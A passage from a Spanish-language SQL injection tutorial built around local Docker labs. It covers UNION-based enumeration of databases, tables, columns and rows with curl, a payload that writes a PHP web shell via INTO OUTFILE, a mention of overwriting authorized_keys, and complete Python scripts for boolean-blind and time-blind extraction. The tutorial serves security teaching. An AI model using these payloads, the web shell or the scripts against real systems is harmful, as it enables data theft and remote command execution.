\u0026#39;s/\u0026lt;br\u0026gt;/\\n/g\u0026#39; Nombre: Joan Rol: admin Nombre: b Rol: c Sabemos que podemos ver los datos de las columnas 2 y 3.\nEnumeración bases de datos Para saber que bases de datos existen usaremos el siguiente payload\nunion select NULL,schema_name,NULL from informationschema.schemata-- - Que significa schema_name, information_schema y schemata?, para saberlo vamos a mirar la base de datos del contenedor sql. Para encontrar el identificador del contenedor hay que ejecutar sudo docker ps\n\u0026gt; sudo docker ps CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES 52e31603f6a9 php:7.4-apache \u0026#34;docker-php-entrypoi…\u0026#34; 13 hours ago Up 8 minutes 0.0.0.0:80-\u0026gt;80/tcp, :::80-\u0026gt;80/tcp lab1_web_1 d71dbadbe4d0 mysql:5.7 \u0026#34;docker-entrypoint.s…\u0026#34; 13 hours ago Up 8 minutes 0.0.0.0:3306-\u0026gt;3306/tcp, :::3306-\u0026gt;3306/tcp, 33060/tcp lab1_db_1 Ahora ya tenemos el id y podemos ejecutar una bash en el contenedor, y después entrar a mysql.\n\u0026gt; sudo docker exec -it d71dbadbe4d0 bash bash-4.2# mysql -u root -p Enter password: Si miramos las bases de datos con show databases; vemos que existe una base de datos que es predeterminada llamada information_schema\nmysql\u0026gt; show databases; +--------------------+ | Database | +--------------------+ | information_schema | | my_database | | mysql | | performance_schema | | sys | +--------------------+ 5 rows in set (0.00 sec) Dentro de la base de datos information_schema existe una tabla entre muchas llamada schemata\nmysql\u0026gt; use information_schema Reading table information for completion of table and column names You can turn off this feature to get a quicker startup with -A Database changed mysql\u0026gt; show tables; +---------------------------------------+ | Tables_in_information_schema | +---------------------------------------+ | CHARACTER_SETS | | COLLATIONS | | COLLATION_CHARACTER_SET_APPLICABILITY | | COLUMNS | | .... | | SCHEMATA | | ... | +---------------------------------------+ 61 rows in set (0.00 sec) Y por último dentro de la tabla schemata, concretamente en la columna \u0026lsquo;schema_name\u0026rsquo;\u0026rsquo; están los nombres de las bases de datos.\nmysql\u0026gt; select * from schemata; +--------------+--------------------+----------------------------+------------------------+----------+ | CATALOG_NAME | SCHEMA_NAME | DEFAULT_CHARACTER_SET_NAME | DEFAULT_COLLATION_NAME | SQL_PATH | +--------------+--------------------+----------------------------+------------------------+----------+ | def | information_schema | utf8 | utf8_general_ci | NULL | | def | my_database | latin1 | latin1_swedish_ci | NULL | | def | mysql | latin1 | latin1_swedish_ci | NULL | | def | performance_schema | utf8 | utf8_general_ci | NULL | | def | sys | utf8 | utf8_general_ci | NULL | +--------------+--------------------+----------------------------+------------------------+----------+ 5 rows in set (0.00 sec) Si volvemos al payload que teníamos antes, vemos que lo que estamos diciendo es, que meta la columna \u0026lsquo;schema_name\u0026rsquo; (la cual contiene los nombres de las bases de datos) en la columna numero 2. Despues le decimos con from donde está esa columna, que está en la base de datos \u0026lsquo;information_schema\u0026rsquo; y en la tabla schemata:\nunion select NULL,schema_name,NULL from informationschema.schemata \u0026gt; curl -s -G \u0026#34;localhost\u0026#34; --data-urlencode \u0026#34;nombre=joan\u0026#39; union select NULL,schema_name,NULL from information_schema.schemata-- -\u0026#34; | sed \u0026#39;s/\u0026lt;br\u0026gt;/\\n/g\u0026#39; Nombre: Joan Rol: admin Nombre: information_schema Rol: Nombre: my_database Rol: Nombre: mysql Rol: Nombre: performance_schema Rol: Nombre: sys Rol: En este caso vemos que se añade una nueva fila con \u0026lsquo;Nombre: \u0026rsquo; y \u0026lsquo;Rol: \u0026rsquo; Por cada base de datos encontrada, pero esto no siempre va a ser tan fácil en algunas webs puede ser que solo nos muestren el primer dato. En estos casos podemos usar delimitadores para que se vayan mostrando las bases de datos como en el siguiente ejemplo\n\u0026gt; curl -s -G \u0026#34;localhost\u0026#34; --data-urlencode \u0026#34;nombre=\u0026#39; union select NULL,schema_name,NULL from information_schema.schemata limit 0,1-- -\u0026#34; | sed \u0026#39;s/\u0026lt;br\u0026gt;/\\n/g\u0026#39; Nombre: information_schema Rol: \u0026gt; curl -s -G \u0026#34;localhost\u0026#34; --data-urlencode \u0026#34;nombre=\u0026#39; union select NULL,schema_name,NULL from information_schema.schemata limit 2,1-- -\u0026#34; | sed \u0026#39;s/\u0026lt;br\u0026gt;/\\n/g\u0026#39; Nombre: mysql Rol: Esto ya empieza a tener muy buena pinta\u0026hellip; tenemos la capacidad de enumerar las bases de datos.\nEnumeración de las tablas Ahora toca enumerar las tablas, el procedimiento es bastante parecido.\nDentro de la base de datos information_schema hay una tabla llamada tables la cual contiene el nombre de todas las tablas.\n+---------------------------------------+ | Tables_in_information_schema | +---------------------------------------+ | CHARACTER_SETS | | COLLATIONS | | COLLATION_CHARACTER_SET_APPLICABILITY | | ... | | TABLES | | ... | +---------------------------------------+ Dentro de la tabla tables hay una columna llamada table_name con el nombre de las tablas, y otra llamada table_schema la cual tiene el nombre de la base de datos a la cual pertenece la tabla. Por ejemplo en la siguiente instrucción se muestran las tablas de la base de datos \u0026lsquo;my_database\u0026rsquo;\nmysql\u0026gt; select table_name from tables where table_schema = \u0026#39;my_database\u0026#39; ; +------------+ | table_name | +------------+ | mi_tabla | +------------+ Esto aplicado a la inyección quedaria de la siguiente forma\nunion select NULL,table_name,NULL from information_schema.tables where table_schema = \u0026#39;my_database\u0026#39;-- - \u0026gt; curl -s -G \u0026#34;localhost\u0026#34; --data-urlencode \u0026#34;nombre=joan\u0026#39; union select NULL,table_name,NULL from information_schema.tables where table_schema = \u0026#39;my_database\u0026#39;-- -\u0026#34; | sed \u0026#39;s/\u0026lt;br\u0026gt;/\\n/g\u0026#39; Nombre: Joan Rol: admin Nombre: mi_tabla Rol: Igual que con las bases de datos si es una inyección en la cual solo vemos el primer dato, podemos usar delimitadores, para ir viendo los nombres uno por uno\n\u0026gt; curl -s -G \u0026#34;localhost\u0026#34; --data-urlencode \u0026#34;nombre=\u0026#39; union select NULL,table_name,NULL from information_schema.tables where table_schema = \u0026#39;my_database\u0026#39; limit 0,1 -- -\u0026#34; | sed \u0026#39;s/\u0026lt;br\u0026gt;/\\n/g\u0026#39; Nombre: mi_tabla Rol: Columnas Una vez tenemos las tablas, tocan las columnas.\nDentro de la base de datos information_schema hay una tabla llamada columns en la cual están los nombres de las columnas\nmysql\u0026gt; show tables; +---------------------------------------+ | Tables_in_information_schema | +---------------------------------------+ | CHARACTER_SETS | | COLLATIONS | | COLLATION_CHARACTER_SET_APPLICABILITY | | COLUMNS | | ... | +---------------------------------------+ 61 rows in set (0.00 sec) De toda esta tabla vamos a usar solo 3 columnas:\ncolumn_name: Contiene el nombre de las columnas table_name: Contiene el nombre de la tabla a la cual pertenece esa columna table_schema: Contiene el nombre de la base de datos a la cual pertenece la columna mysql\u0026gt; select column_name from columns where table_name = \u0026#39;mi_tabla\u0026#39; and table_schema = \u0026#39;my_database\u0026#39;; +-------------+ | column_name | +-------------+ | id | | nombre | | rol | +-------------+ 3 rows in set (0.00 sec) Esto aplicado a la inyección quedaría de la siguiente forma:\n\u0026gt; curl -s -G \u0026#34;localhost\u0026#34; --data-urlencode \u0026#34;nombre=joan\u0026#39; union select NULL,column_name,NULL from information_schema.columns where table_name = \u0026#39;mi_tabla\u0026#39; and table_schema = \u0026#39;my_database\u0026#39;-- -\u0026#34; | sed \u0026#39;s/\u0026lt;br\u0026gt;/\\n/g\u0026#39; Nombre: Joan Rol: admin Nombre: id Rol: Nombre: nombre Rol: Nombre: rol Rol: Otra vez si solo nos muestra un dato, podemos usar delimitadores para ir viéndolos poco a poco.\n\u0026gt; curl -s -G \u0026#34;localhost\u0026#34; --data-urlencode \u0026#34;nombre=\u0026#39; union select NULL,column_name,NULL from information_schema.columns where table_schema = \u0026#39;my_database\u0026#39; and table_name = \u0026#39;mi_tabla\u0026#39;limit 0,1 -- -\u0026#34; | sed \u0026#39;s/\u0026lt;br\u0026gt;/\\n/g\u0026#39; Nombre: id Rol: \u0026gt; curl -s -G \u0026#34;localhost\u0026#34; --data-urlencode \u0026#34;nombre=\u0026#39; union select NULL,column_name,NULL from information_schema.columns where table_schema = \u0026#39;my_database\u0026#39; and table_name = \u0026#39;mi_tabla\u0026#39;limit 1,1 -- -\u0026#34; | sed \u0026#39;s/\u0026lt;br\u0026gt;/\\n/g\u0026#39; Nombre: nombre Rol: \u0026gt; curl -s -G \u0026#34;localhost\u0026#34; --data-urlencode \u0026#34;nombre=\u0026#39; union select NULL,column_name,NULL from information_schema.columns where table_schema = \u0026#39;my_database\u0026#39; and table_name = \u0026#39;mi_tabla\u0026#39;limit 2,1 -- -\u0026#34; | sed \u0026#39;s/\u0026lt;br\u0026gt;/\\n/g\u0026#39; Nombre: rol Rol: Data Por último solo nos quedaría ver el contenido de las columnas que hemos encontrado. La petición ahora es mucho más sencilla. En mysql se vería así\nmysql\u0026gt; select nombre from mi_tabla; +--------+ | nombre | +--------+ | Joan | | Quim | | Andreu | +--------+ Y la inyección sería simplemente la siguiente\ncurl -s -G \u0026#34;localhost\u0026#34; --data-urlencode \u0026#34;nombre=joan\u0026#39; union select NULL,nombre,NULL from my_database.mi_tabla-- -\u0026#34; | sed \u0026#39;s/\u0026lt;br\u0026gt;/\\n/g\u0026#39; Nombre: Joan Rol: admin Nombre: Joan Rol: Nombre: Quim Rol: Nombre: Andreu Rol: \u0026gt; curl -s -G \u0026#34;localhost\u0026#34; --data-urlencode \u0026#34;nombre=joan\u0026#39; union select NULL,nombre,rol from my_database.mi_tabla-- -\u0026#34; | sed \u0026#39;s/\u0026lt;br\u0026gt;/\\n/g\u0026#39; Nombre: Joan Rol: admin Nombre: Joan Rol: admin Nombre: Quim Rol: user Nombre: Andreu Rol: user En este caso podemos ver el contenido de varias columnas a la vez de forma simple, pero no siempre es así. Si solo podemos mostrar datos en una columna podemos concatenar datos con \u0026lsquo;group_concat()\u0026rsquo;\ngroup_concat(nombre,\u0026#39;:\u0026#39;,rol) Con esto estaremos mostrando el contenido de la columna nombre y de la columna rol en la misma columna.\n\u0026gt; curl -s -G \u0026#34;localhost\u0026#34; --data-urlencode \u0026#34;nombre=joan\u0026#39; union select NULL,group_concat(nombre,\u0026#39;:\u0026#39;,rol) ,NULL from my_database.mi_tabla-- -\u0026#34; | sed \u0026#39;s/\u0026lt;br\u0026gt;/\\n/g\u0026#39; Nombre: Joan Rol: admin Nombre: Joan:admin,Quim:user,Andreu:user Rol: Si solo nos muestra el primer dato podemos usar delimitadores para ir mostrándolos poco a poco\n\u0026gt; curl -s -G \u0026#34;localhost\u0026#34; --data-urlencode \u0026#34;nombre=\u0026#39; union select NULL,nombre,rol from my_database.mi_tabla limit 0,1 -- -\u0026#34; | sed \u0026#39;s/\u0026lt;br\u0026gt;/\\n/g\u0026#39; Nombre: Joan Rol: admin \u0026gt; curl -s -G \u0026#34;localhost\u0026#34; --data-urlencode \u0026#34;nombre=\u0026#39; union select NULL,nombre,rol from my_database.mi_tabla limit 1,1 -- -\u0026#34; | sed \u0026#39;s/\u0026lt;br\u0026gt;/\\n/g\u0026#39; Nombre: Quim Rol: user \u0026gt; curl -s -G \u0026#34;localhost\u0026#34; --data-urlencode \u0026#34;nombre=\u0026#39; union select NULL,nombre,rol from my_database.mi_tabla limit 2,1 -- -\u0026#34; | sed \u0026#39;s/\u0026lt;br\u0026gt;/\\n/g\u0026#39; Nombre: Andreu Rol: user Subida de archivos Aparte de sacar información de la base de datos también podemos probar de escribir archivos. Esto lo haremos poniendo el contenido que queremos meter en el archivo en una columna y luego lo redirigiremos con \u0026lsquo;into outfile\u0026rsquo; al \u0026lsquo;/tmp/sqli\u0026rsquo;\n?nombre=joan\u0026#39; union select NULL,\u0026#34;holaaaaaa\u0026#34;,NULL into outfile \u0026#34;/tmp/sqli\u0026#34;-- - Para comprobar si ha funcionado vamos a abrir una terminal con el contendor. Primero buscaremos el id del contenedor\n\u0026gt; sudo docker ps CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES c4b17fc1716b php:7.4-apache \u0026#34;docker-php-entrypoi…\u0026#34; 13 seconds ago Up 12 seconds 0.0.0.0:80-\u0026gt;80/tcp, :::80-\u0026gt;80/tcp lab1_web_1 5f7d54a374b0 mysql:5.7 \u0026#34;docker-entrypoint.s…\u0026#34; 13 seconds ago Up 12 seconds 0.0.0.0:3306-\u0026gt;3306/tcp, :::3306-\u0026gt;3306/tcp, 33060/tcp lab1_db_1 Después ejecutaremos una bash en el contenedor mysql\n\u0026gt; sudo docker exec -it 5f7d54a374b0 bash bash-4.2# ls bin dev\tentrypoint.sh home lib64 mnt proc run srv tmp var boot docker-entrypoint-initdb.d etc\tlib media opt root sbin sys usr Por último, comprobamos:\nbash-4.2# ls /tmp a sqli testing_sqli bash-4.2# cat /tmp/sqli 1\tJoan\tadmin \\N\tholaaaaaa\t\\N ¿De qué nos sirve esto?\nPodemos usar esta técnica para por ejemplo modificar el authorized_keys de un usuario del sistema para poder entrar sin proporcionar contraseña. El authorized_keys por defecto está en \u0026lsquo;/home/(user)/.ssh/authorized_keys\u0026rsquo;\nTambién lo podemos usar para crear un nuevo archivo php en la web con código malicioso el cual nos permita ejecutar comandos.\n\u0026#39; union select NULL,\u0026#34;\u0026lt;?php system($_GET[\u0026#39;cmd\u0026#39;]);\u0026#34;,NULL into outfile \u0026#34;/var/www/html/cmd.php\u0026#34;-- - Esto básicamente lo que hace es crear un archivo en /var/www/html que es la ruta por defecto para las webs. El archivo que crea le mete codigo php el cual hace que todo lo que reciba por GET, por el parámetro cmd (localhost/cmd.php?cmd=) lo ejecutara con la función system. Lo que permitirá tener una ejecución remota de comandos.\nEn el laboratorio 1 no se puede probar, ya que la web y la base de datos están en contenedores distintos.\nBooleana Laboratorio\nPara la explicación se va a usar el laboratorio 3:\nDescarga el laboratorio\nDescomprímelo y entra a la carpeta\nunzip lab3.zip cd lab3 Despliega el contenedor\ndocker-compose up --build En este tipo de inyecciones no vamos a ver el output de las querys maliciosas.\nEmpezamos mandando una petición normal, y al final le ponemos algo que sea True como por ejemplo (1=1, a=a, \u0026lsquo;a\u0026rsquo;=\u0026lsquo;a\u0026rsquo;), mirando las respuestas podemos ver que cuando la solicitud es correcta vemos el Nombre y el Rol, pero cuando la petición es incorrecta no sale ni el Nombre ni el Rol\ncurl -s -G \u0026#34;localhost\u0026#34; --data-urlencode \u0026#34;nombre=joan\u0026#39; and 1=1 -- -\u0026#34; | sed \u0026#39;s/\u0026lt;br\u0026gt;/\\n/g\u0026#39; Nombre: Joan Rol: admin curl -s -G \u0026#34;localhost\u0026#34; --data-urlencode \u0026#34;nombre=joan\u0026#39; and 1=2 -- -\u0026#34; | sed \u0026#39;s/\u0026lt;br\u0026gt;/\\n/g\u0026#39; Esto dependiendo de la web puede cambiar lo que se muestra o se deja de mostrar, a veces pueden ser detalles muy pequeños\nPara sacar información con este método podemos hacer una petición diciendo que el primer carácter de el primer base de datos es una \u0026rsquo;m\u0026rsquo;, en el caso de que la afirmación sea cierta veremos el Nombre y el Rol, de caso contrario que no acertemos el caracter no nos saldrá nada.\ncurl -s -G \u0026#34;localhost\u0026#34; --data-urlencode \u0026#34;nombre=joan\u0026#39; and substr((select schema_name from information_schema.schemata limit 1,1),1,1)=\u0026#39;m\u0026#39;-- -\u0026#34; | sed \u0026#39;s/\u0026lt;br\u0026gt;/\\n/g\u0026#39; Nombre: Joan Rol: admin curl -s -G \u0026#34;localhost\u0026#34; --data-urlencode \u0026#34;nombre=joan\u0026#39; and substr((select schema_name from information_schema.schemata limit 1,1),1,1)=\u0026#39;a\u0026#39;-- -\u0026#34; | sed \u0026#39;s/\u0026lt;br\u0026gt;/\\n/g\u0026#39; De forma manual tardaríamos una eternidad en sacar la información de la base de datos así que podemos automatizarlo con python\nBase de datos Para enumerar las bases de datos vamos a usar el siguiente payload\njoan\u0026#39; and substr((select schema_name from information_schema.schemata limit 1,1),1,1)=\u0026#39;m\u0026#39;-- - En el script declaramos una variable llamada mensaje la cual contiene el mensaje que devuelve la web cuando la query sql es correcta, cada vez que el script lanze una petición comprobara si en la respuesta está este mensaje. Después calculamos la cantidad de bases de datos. Por último se calcula el \u0026ldquo;Length\u0026rdquo; de cada nombre de la base de datos y se hace fuerza bruta para sacar cada caracter.\nfrom pwn import * import requests import string url = \u0026#34;http://localhost/?nombre=joan\u0026#39;\u0026#34; characters = string.ascii_lowercase + string.digits + \u0026#34;_\u0026#34; + \u0026#34;-\u0026#34; + \u0026#34;.\u0026#34; + \u0026#34;@\u0026#34; mensaje = \u0026#34;Nombre: Joan\u0026#34; def database(url,characters,mensaje): p1 = log.progress(\u0026#34;Probando con\u0026#34;) p2 = log.progress(\u0026#34;Bases de datos\u0026#34;) database = \u0026#34;\u0026#34; for i in range(100): payload = \u0026#34;{} and (select count(schema_name) from information_schema.schemata)={}-- -\u0026#34;.format(url,i) r = requests.get(payload) if mensaje in r.text: dbs = i break for db in range(dbs): for i in range(100): payload = \u0026#34;{} and LENGTH((select schema_name from information_schema.schemata limit {}, 1))={}-- -\u0026#34;.format(url, db, i) r = requests.get(payload) if mensaje in r.text: db_length = i + 1 break database += \u0026#34;\\n[*] \u0026#34; for position in range(db_length): for char in characters: p1.status(char) payload = \u0026#34;{} and substr((select schema_name from information_schema.schemata limit {},1),{},1)=\u0026#39;{}\u0026#39;-- -\u0026#34;.format(url, db, position, char) r = requests.get(payload) if mensaje in r.text: database += char p2.status(database) break database(url,characters,mensaje) Tablas from pwn import * import requests import string url = \u0026#34;http://localhost/?nombre=joan\u0026#39;\u0026#34; characters = string.ascii_lowercase + string.digits + \u0026#34;_\u0026#34; + \u0026#34;-\u0026#34; + \u0026#34;.\u0026#34; + \u0026#34;@\u0026#34; mensaje = \u0026#34;Nombre: Joan\u0026#34; def tables(url,characters): p1 = log.progress(\u0026#34;Probando con\u0026#34;) p2 = log.progress(\u0026#34;Tablas\u0026#34;) tables = \u0026#34;\u0026#34; for i in range(100): payload = \u0026#34;{} and (select count(table_name) from information_schema.tables where table_schema = \u0026#39;my_database\u0026#39;)={}-- -\u0026#34;.format(url,i) r = requests.get(payload) if mensaje in r.text: tbs = i break for tb in range(tbs): for i in range(100): payload = \u0026#34;{} and LENGTH((select table_name from information_schema.tables where table_schema = \u0026#39;my_database\u0026#39; limit {}, 1))={}-- -\u0026#34;.format(url, tb, i) r = requests.get(payload) if mensaje in r.text: tb_length = i + 1 break tables += \u0026#34;\\n[*] \u0026#34; for position in range(tb_length): for char in characters: p1.status(char) payload = \u0026#34;{} and substr((select table_name from information_schema.tables where table_schema = \u0026#39;my_database\u0026#39; limit {},1),{},1)=\u0026#39;{}\u0026#39;-- -\u0026#34;.format(url, tb, position, char) r = requests.get(payload) if mensaje in r.text: tables += char p2.status(tables) break tables(url,characters) Columnas from pwn import * import requests import string url = \u0026#34;http://localhost/?nombre=joan\u0026#39;\u0026#34; characters = string.ascii_lowercase + string.digits + \u0026#34;_\u0026#34; + \u0026#34;-\u0026#34; + \u0026#34;.\u0026#34; + \u0026#34;@\u0026#34; mensaje = \u0026#34;Nombre: Joan\u0026#34; def columns(url,characters): p1 = log.progress(\u0026#34;Probando con\u0026#34;) p2 = log.progress(\u0026#34;Columnas\u0026#34;) columns = \u0026#34;\u0026#34; for i in range(100): payload = \u0026#34;{} and (select count(column_name) from information_schema.columns where table_schema = \u0026#39;my_database\u0026#39; and table_name = \u0026#39;mi_tabla\u0026#39;)={}-- -\u0026#34;.format(url,i) r = requests.get(payload) if mensaje in r.text: cols = i break for col in range(cols): for i in range(100): payload = \u0026#34;{} and LENGTH((select column_name from information_schema.columns where table_schema = \u0026#39;my_database\u0026#39; and table_name = \u0026#39;mi_tabla\u0026#39; limit {}, 1))={}-- -\u0026#34;.format(url, col, i) r = requests.get(payload) if mensaje in r.text: col_length = i + 1 break columns += \u0026#34;\\n[*] \u0026#34; for position in range(col_length): for char in characters: p1.status(char) payload = \u0026#34;{} and substr((select column_name from information_schema.columns where table_schema = \u0026#39;my_database\u0026#39; and table_name = \u0026#39;mi_tabla\u0026#39; limit {},1),{},1)=\u0026#39;{}\u0026#39;-- -\u0026#34;.format(url, col, position, char) r = requests.get(payload) if mensaje in r.text: columns += char p2.status(columns) break columns(url,characters) Data from pwn import * import requests import string url = \u0026#34;http://localhost/?nombre=joan\u0026#39;\u0026#34; characters = string.ascii_lowercase + string.digits + \u0026#34;_\u0026#34; + \u0026#34;-\u0026#34; + \u0026#34;.\u0026#34; + \u0026#34;@\u0026#34; + \u0026#34;:\u0026#34; mensaje = \u0026#34;Nombre: Joan\u0026#34; def data(url,characters): p1 = log.progress(\u0026#34;Probando con\u0026#34;) p2 = log.progress(\u0026#34;Datos\u0026#34;) datos = \u0026#34;\u0026#34; for i in range(100): payload = \u0026#34;{} and (select count(nombre) from my_database.mi_tabla)={}-- -\u0026#34;.format(url,i) r = requests.get(payload) if mensaje in r.text: dts = i break for dt in range(dts): for i in range(100): payload = \u0026#34;{} and LENGTH((select nombre from my_database.mi_tabla limit {}, 1))={}-- -\u0026#34;.format(url, dt, i) r = requests.get(payload) if mensaje in r.text: dt_length = i + 1 break datos += \u0026#34;\\n[*] \u0026#34; for position in range(dt_length): for char in characters: p1.status(char) payload = \u0026#34;{} and substr((select nombre from my_database.mi_tabla limit {},1),{},1)=\u0026#39;{}\u0026#39;-- -\u0026#34;.format(url, dt, position, char) r = requests.get(payload) if mensaje in r.text: datos += char p2.status(datos) break data(url,characters) Mas información relevante version() [Versión Base de datos]\rSELECT version(); from pwn import * import requests import string url = \u0026#34;http://localhost/?nombre=joan\u0026#39;\u0026#34; characters = string.ascii_lowercase + string.digits + \u0026#34;_\u0026#34; + \u0026#34;-\u0026#34; + \u0026#34;.\u0026#34; + \u0026#34;@\u0026#34; + \u0026#34;:\u0026#34; mensaje = \u0026#34;Nombre: Joan\u0026#34; def version(url,characters): p1 = log.progress(\u0026#34;Probando con\u0026#34;) p2 = log.progress(\u0026#34;Datos\u0026#34;) versions = \u0026#34;\u0026#34; for v in range(1): for i in range(100): payload = \u0026#34;{} and LENGTH((select version() limit {}, 1))={}-- -\u0026#34;.format(url, v, i) r = requests.get(payload) if mensaje in r.text: v_length = i + 1 break versions += \u0026#34;\\n[*] \u0026#34; for position in range(v_length): for char in characters: p1.status(char) payload = \u0026#34;{} and substr((select version() limit {},1),{},1)=\u0026#39;{}\u0026#39;-- -\u0026#34;.format(url, v, position, char) r = requests.get(payload) if mensaje in r.text: versions += char p2.status(versions) break version(url,characters) user() [Usuario que ejecuta la base de datos]\rSELECT user(); \u0026gt; python3 main.py [\u0026gt;] Probando con: 3 [*] Usuario: [*] root@172.19.0.3 from pwn import * import requests import string url = \u0026#34;http://localhost/?nombre=joan\u0026#39;\u0026#34; characters = string.ascii_lowercase + string.digits + \u0026#34;_\u0026#34; + \u0026#34;-\u0026#34; + \u0026#34;.\u0026#34; + \u0026#34;@\u0026#34; + \u0026#34;:\u0026#34; mensaje = \u0026#34;Nombre: Joan\u0026#34; def user(url,characters): p1 = log.progress(\u0026#34;Probando con\u0026#34;) p2 = log.progress(\u0026#34;Usuario\u0026#34;) users = \u0026#34;\u0026#34; for user in range(1): for i in range(100): payload = \u0026#34;{} and LENGTH((select user() limit {}, 1))={}-- -\u0026#34;.format(url, user, i) r = requests.get(payload) if mensaje in r.text: v_length = i + 1 break users += \u0026#34;\\n[*] \u0026#34; for position in range(v_length): for char in characters: p1.status(char) payload = \u0026#34;{} and substr((select user() limit {},1),{},1)=\u0026#39;{}\u0026#39;-- -\u0026#34;.format(url, user, position, char) r = requests.get(payload) if mensaje in r.text: users += char p2.status(users) break user(url,characters) database() [Base de datos en uso]\rSELECT database(); \u0026gt; python3 main.py [-] Probando con: e [ ] Base de datos en uso: [*] my_database from pwn import * import requests import string url = \u0026#34;http://localhost/?nombre=joan\u0026#39;\u0026#34; characters = string.ascii_lowercase + string.digits + \u0026#34;_\u0026#34; + \u0026#34;-\u0026#34; + \u0026#34;.\u0026#34; + \u0026#34;@\u0026#34; + \u0026#34;:\u0026#34; mensaje = \u0026#34;Nombre: Joan\u0026#34; def user(url,characters): p1 = log.progress(\u0026#34;Probando con\u0026#34;) p2 = log.progress(\u0026#34;Base de datos en uso\u0026#34;) databases = \u0026#34;\u0026#34; for db in range(1): for i in range(100): payload = \u0026#34;{} and LENGTH((select database() limit {}, 1))={}-- -\u0026#34;.format(url, db, i) r = requests.get(payload) if mensaje in r.text: db_length = i + 1 break databases += \u0026#34;\\n[*] \u0026#34; for position in range(db_length): for char in characters: p1.status(char) payload = \u0026#34;{} and substr((select database() limit {},1),{},1)=\u0026#39;{}\u0026#39;-- -\u0026#34;.format(url, db, position, char) r = requests.get(payload) if mensaje in r.text: databases += char p2.status(databases) break user(url,characters) Basada en tiempo a ciegas Laboratorio\nPara la explicación se va a usar el laboratorio 3:\nDescarga el laboratorio\nDescomprímelo y entra a la carpeta\nunzip lab3.zip cd lab3 Despliega el contenedor\ndocker-compose up --build En estas inyecciones no vamos a estar viendo el output, así que vamos a jugar con los tiempos de carga del servidor\nEmpezamos mandando una petición en la cual le decimos a la base de datos que se espere 5 segundos, Para saber si la inyección funciona, vamos a usar el comando time el cual nos dirá cuanto ha tardado\n\u0026gt; time curl -s -G \u0026#34;localhost\u0026#34; --data-urlencode \u0026#34;nombre=joan\u0026#39; and sleep(5) -- -\u0026#34; | sed \u0026#39;s/\u0026lt;br\u0026gt;/\\n/g\u0026#39; real\t5.03s Ha tardado 5.03 segundos lo que significa que aparentemente ha funcionado la inyección\nBase de datos Para enumerar las bases de datos vamos a usar el siguiente payload\njoan\u0026#39; and if(substr((select schema_name from information_schema.schemata limit 1,1),1,1)=\u0026#39;a\u0026#39;,sleep(5),1)-- - ¿Qué estamos haciendo con esto?\nLe estamos diciendo que \u0026ldquo;si el nombre de la primera base de datos empieza por \u0026lsquo;a\u0026rsquo;, quédate esperando 5 segundos\u0026rdquo;\nEsto no tardará 5 segundos, ya que no empieza por a, pero con la m si se queda colgado.\n\u0026gt; time curl -s -G \u0026#34;localhost\u0026#34; --data-urlencode \u0026#34;nombre=joan\u0026#39; and if(substr((select schema_name from information_schema.schemata limit 1,1),1,1)=\u0026#39;a\u0026#39;,sleep(5),1)-- -\u0026#34; | sed \u0026#39;s/\u0026lt;br\u0026gt;/\\n/g\u0026#39; Nombre: Joan Rol: admin real\t0.01s \u0026gt; time curl -s -G \u0026#34;localhost\u0026#34; --data-urlencode \u0026#34;nombre=joan\u0026#39; and if(substr((select schema_name from information_schema.schemata limit 1,1),1,1)=\u0026#39;m\u0026#39;,sleep(5),1)-- -\u0026#34; | sed \u0026#39;s/\u0026lt;br\u0026gt;/\\n/g\u0026#39; real\t5.02s Si lo hacemos manualmente vamos a tardar mucho, así que podemos hacer un script en python que lo automatice\nfrom pwn import * import requests import string url = \u0026#34;http://localhost/?nombre=joan\u0026#39;\u0026#34; sleep_time = 0.05 characters = string.ascii_lowercase + string.digits + \u0026#34;_\u0026#34; + \u0026#34;-\u0026#34; + \u0026#34;.\u0026#34; + \u0026#34;@\u0026#34; def database(url,sleep_time,characters): p1 = log.progress(\u0026#34;Probando con\u0026#34;) p2 = log.progress(\u0026#34;Bases de datos\u0026#34;) database = \u0026#34;\u0026#34; for i in range(100): payload = \u0026#34;{} and if((select count(schema_name) from information_schema.schemata)={}, sleep({}), 1)-- -\u0026#34;.format(url,i,sleep_time) r = requests.get(payload) if r.elapsed.total_seconds() \u0026gt;= sleep_time: dbs = i break for db in range(dbs): for i in range(100): payload = \u0026#34;{} and if(LENGTH((select schema_name from information_schema.schemata limit {}, 1))={}, sleep({}), 1)-- -\u0026#34;.format(url, db, i, sleep_time) r = requests.get(payload) if r.elapsed.total_seconds() \u0026gt;= sleep_time: db_length = i + 1 break database += \u0026#34;\\n[*] \u0026#34; for position in range(db_length): for char in characters: p1.status(char) payload = \u0026#34;{} and if(substr((select schema_name from information_schema.schemata limit {},1),{},1)=\u0026#39;{}\u0026#39;,sleep({}),1)-- -\u0026#34;.format(url, db, position, char, sleep_time) r = requests.get(payload) if r.elapsed.total_seconds() \u0026gt;= sleep_time: database += char p2.status(database) break database(url,sleep_time,characters) Tables from pwn import * import requests import string url = \u0026#34;http://localhost/?nombre=joan\u0026#39;\u0026#34; sleep_time = 0.05 characters = string.ascii_lowercase + string.digits + \u0026#34;_\u0026#34; + \u0026#34;-\u0026#34; + \u0026#34;.\u0026#34; + \u0026#34;@\u0026#34; def tables(url,sleep_time,characters): p1 = log.progress(\u0026#34;Probando con\u0026#34;) p2 = log.progress(\u0026#34;Tablas\u0026#34;) tables = \u0026#34;\u0026#34; for i in range(100): payload = \u0026#34;{} and if((select count(table_name) from information_schema.tables where table_schema = \u0026#39;my_database\u0026#39;)={}, sleep({}), 1)-- -\u0026#34;.format(url,i,sleep_time) r = requests.get(payload) if r.elapsed.total_seconds() \u0026gt;= sleep_time: tbs = i break for tb in range(tbs): for i in range(100): payload = \u0026#34;{} and if(LENGTH((select table_name from information_schema.tables where table_schema = \u0026#39;my_database\u0026#39; limit {}, 1))={}, sleep({}), 1)-- -\u0026#34;.format(url, tb, i, sleep_time) r = requests.get(payload) if r.elapsed.total_seconds() \u0026gt;= sleep_time: tb_length = i + 1 break tables += \u0026#34;\\n[*] \u0026#34; for position in range(tb_length): for char in characters: p1.status(char) payload = \u0026#34;{} and if(substr((select table_name from information_schema.tables where table_schema = \u0026#39;my_database\u0026#39; limit {},1),{},1)=\u0026#39;{}\u0026#39;,sleep({}),1)-- -\u0026#34;.format(url, tb, position, char, sleep_time) r = requests.get(payload) if r.elapsed.total_seconds() \u0026gt;= sleep_time: tables += char p2.status(tables) break tables(url,sleep_time,characters) Columns from pwn import * import requests import string url = \u0026#34;http://localhost/?nombre=joan\u0026#39;\u0026#34; sleep_time = 0.1 characters = 